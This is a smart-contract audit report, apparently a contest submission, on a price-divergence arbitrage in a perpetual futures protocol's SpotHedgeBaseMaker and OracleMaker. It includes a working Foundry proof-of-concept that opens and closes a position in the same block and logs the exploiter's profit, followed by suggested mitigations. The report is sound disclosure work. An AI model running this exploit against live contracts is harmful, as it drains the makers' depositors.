Clumsy Chambray Gazelle

high

# Price difference between pyth oracle and uniswap can be exploited for immediate gain by takers

## Summary

Because the pyth oracle price is based on multiple onchain/offchain sources, temporary divergence of its price from that of the uniswap pool is not unlikely. When this happens (for example pyth price is slightly below the uniswap pool price), an exploiter can open a short position on SpotHedgeBaseMaker and immediately close it on the oracle maker (in the same transaction/block) which can gain them riskless profit on the expense of automated maker shareholders.

## Vulnerability Detail

The vulnerability described here is caused by a combination of two factors:  
1. The fact that the SpotHedgeBaseMaker uses uniswap price to quote positions , without any limitations on the gap between the uniswap price and the current pyth oracle price, as seen here:
 ```solidity
 if (isExactInput) {
                uint256 quoteTokenRequired = _formatPerpToSpotQuoteDecimals(amount);
                // get quote
                //// NOTE: OppositeAmount is based on the uniswap pool quote
                uint256 oppositeAmountXSpotDecimals = _getSpotHedgeBaseMakerStorage().uniswapV3Quoter.quoteExactInput(
                    path,
                    quoteTokenRequired
                );
                
                oppositeAmount = _formatSpotToPerpBaseDecimals(oppositeAmountXSpotDecimals);

                fillOrderCallbackData.amountXSpotDecimals = quoteTokenRequired;
                fillOrderCallbackData.oppositeAmountXSpotDecimals = oppositeAmountXSpotDecimals;
            } else {
                uint256 baseTokenRequired = _formatPerpToSpotBaseDecimals(amount);
                // get quote
                //// NOTE: OppositeAmount is based on the uniswap pool quote
                uint256 oppositeAmountXSpotDecimals = _getSpotHedgeBaseMakerStorage().uniswapV3Quoter.quoteExactOutput(
                    path,
                    baseTokenRequired
                );
                oppositeAmount = _formatSpotToPerpQuoteDecimals(oppositeAmountXSpotDecimals);

                fillOrderCallbackData.amountXSpotDecimals = baseTokenRequired;
                fillOrderCallbackData.oppositeAmountXSpotDecimals = oppositeAmountXSpotDecimals;
            }
```
2. The fact that takers can open a position on one maker and immediately close it on the other maker within the same block (no cooldown period or a one-position-change-per-block limit).

Given these two facts, when the Uniswap price diverges from pyth price an exploiter can perform the following flow:

Example:  
A. Starting state: Eth/USDT market where both the uniswap pool and pyth oracle price are $2000  
B. A pyth update transaction is in the mempool, updating the price to 2% below the current price.  
C. An exploiter sees the transaction and sends a transaction to follow it with the following operations:  
C.1. Open a short position on SpotHedgeBaseMaker with size 110eth. (the exact optimal amount can be calculated ahead, to work out the tradeoff between the increase in  profit due to a large trade, and decrease in profit due to more slippage on Uniswap)  
C.2. Close the position (entirely) on the oracle maker.  
C.3. Withdraw profits  

Cost: Because the trader opens and closes the position within the same block, there are no added costs from borrowing/funding fees, since these depend on time elapsing while the position is open. Therefore the only cost is the loss from the price spread between the opened position and the closed one. These depend in turn on the oracle maker utilization rate (which determines its price spread) and the Uniswap pool liquidity (which determines the slippage that determines the SpotHedge maker's quote).

When the uniswap pool liquidity is high and the oracle maker utilization is low, small price differences can generate a significant profit, as the POC below shows.


### POC
To run:  
A. create a test.sol file under the perp-contract-v3/test/spotHedgeMaker/ folder and add the code below to it.
B. Run forge test --match-test testPriceDivergencePOC -vv

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import "../../src/common/LibFormatter.sol";
import { SignedMath } from "@openzeppelin/contracts/utils/math/SignedMath.sol";

contract priceDivergence is SpotHedgeBaseMakerForkSetup {

    using LibFormatter for int256;
    using LibFormatter for uint256;
    using SignedMath for int256;

    //address public taker = makeAddr("Taker");
    address public exploiter = makeAddr("Exploiter");
    OracleMaker public oracle_maker;

    function setUp() public override {
        super.setUp();
        oracle_maker = new OracleMaker();
        _enableInitialize(address(oracle_maker));
        oracle_maker.initialize(marketId, "OM", "OM", address(addressManager), priceFeedId, 1e18);
        config.registerMaker(marketId, address(oracle_maker));

        //PARAMETERS SETUP

        //fee setup
        //funding fee configs (taken from team tests) 
       config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));
        //borrowing fee 0.00000001 per second as in team tests
        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);
        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests
        

        //whitelist users
        oracle_maker.setValidSender(exploiter,true);
        
 

        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)
        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);
        _mockPythPrice(2000,0);

        //add more liquidity ($20M) to uniswap pool
        deal(address(baseToken), spotLp, 10000e9, true);
        deal(address(collateralToken), spotLp, 20000000e6, true);
        vm.startPrank(spotLp);
        uniswapV3NonfungiblePositionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(collateralToken),
                token1: address(baseToken),
                fee: 3000,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: collateralToken.balanceOf(spotLp),
                amount1Desired: baseToken.balanceOf(spotLp),
                amount0Min: 0,
                amount1Min: 0,
                recipient: spotLp,
                deadline: block.timestamp
            })
        );
    }


    function testPriceDivergencePOC() public {
       

        //deposit 30k collateral as margin for exploiter (also mints the amount)
       _deposit(marketId, exploiter, 30000*1e6);

        //deposit to makers
        //initial HSBM maker deposit: 2000 base tokens ($4M)
       vm.startPrank(makerLp);
       deal(address(baseToken), makerLp, 2000*1e9, true);
       baseToken.approve(address(maker), type(uint256).max);
       maker.deposit(2000*1e9);

       //initial oracle maker deposit: $2M (1000 base tokens)
       deal(address(collateralToken), makerLp, 2000000*1e6, true); 
       collateralToken.approve(address(oracle_maker), type(uint256).max);
       oracle_maker.deposit(2000000*1e6);
       vm.stopPrank();

        //add liquidity ($20M) to uniswap pool
        deal(address(baseToken), spotLp, 100000000e9, true);
        deal(address(collateralToken), spotLp, 200000000000e6, true);
        bool baseIs0 = (address(baseToken) < address(collateralToken)) ; 
        vm.startPrank(spotLp);
        uniswapV3NonfungiblePositionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: baseIs0?address(baseToken):address(collateralToken),
                token1: baseIs0?address(collateralToken):address(baseToken),
                fee: 3000,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: baseIs0?baseToken.balanceOf(spotLp):collateralToken.balanceOf(spotLp),
                amount1Desired: baseIs0?collateralToken.balanceOf(spotLp):baseToken.balanceOf(spotLp),
                amount0Min: 0,
                amount1Min: 0,
                recipient: spotLp,
                deadline: block.timestamp
            })
        );
        vm.stopPrank();

        //set oracle price to 2% lower than uniswap
        int64 newPrice = 2000 * 98 / 100;
         _mockPythPrice(newPrice,0);
        console.log("price changed to %s",uint256(uint64(newPrice)));

        //exploiter margin before trades
         console.log("exploiter margin before trades: (margin state + unsettled marging + pending margin): ");
        int256 margDec = vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());
        console.logInt(margDec);
        //OUTPUT
        //exploiter margin before trades: (margin state + unsettled marging + pending margin):
        //30000000000

       //exploiter opens short position on SHBM
        vm.startPrank(exploiter);
        (int256 pbT, int256 pqT) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: true,
                isExactInput: true,
                amount: 110e18,
                oppositeAmountBound:0,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        //exploiter closes position on oracle maker
         int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));
        (int256 pbB, int256 pqB) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(oracle_maker),
                isBaseToQuote: false,
                isExactInput: false,
                amount: exploiterPosSize.abs(),
                oppositeAmountBound:type(uint256).max,
                deadline: block.timestamp,
                makerData: ""
            })
        );
        vm.stopPrank();
        
        //exploiter margin after trades
         console.log("exploiter margin after trades: (margin state + unsettled marging + pending margin): ");
        margDec = vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());
        console.logInt(margDec);
        //OUTPUT
        //exploiter margin after trades: (margin state + unsettled marging + pending margin):
        //33739759474

        //exploiter gained $3739
        
        
    }

    
}
```

## Impact
The operation described above exploits liquidity providers for the makers because the attacker does not pay any fees and does not take any risk. Depositors expect to gain over time from fees and potential PnL gains, however if the following strategy is repeated, over time the maker funds will be drained and share value of maker depositors will be dilluted.

## Code Snippet
https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L365

## Tool used

Manual Review
Foundry

## Recommendations

One option to resolve the issue is to have the SpotHedgeBaseMaker revert on fillOrder if the quote retrieved from uniswap diverges from the current pyth price by more than a set value.
Another option (that can help prevent other opportunistic strategies) is to prevent multiple position operations by the same account in the same market in the same block.